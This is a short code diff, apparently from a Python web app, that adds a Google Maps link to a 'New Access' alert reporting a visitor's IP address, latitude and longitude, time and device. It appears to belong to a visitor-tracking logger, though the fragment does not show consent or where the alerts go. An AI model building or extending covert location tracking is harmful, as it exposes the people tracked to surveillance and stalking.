@@ -37,6 +37,7 @@ def log_initial():
                 "📱 New Access\n"
                 f"🌐 IP: {ip}\n"
                 f"📍 Location: {lat}, {lon}\n"
+                f"🗺️ Map: https://www.google.com/maps?q={lat},{lon}\n"
                 f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                 f"📱 Device: {request.user_agent}"
             )
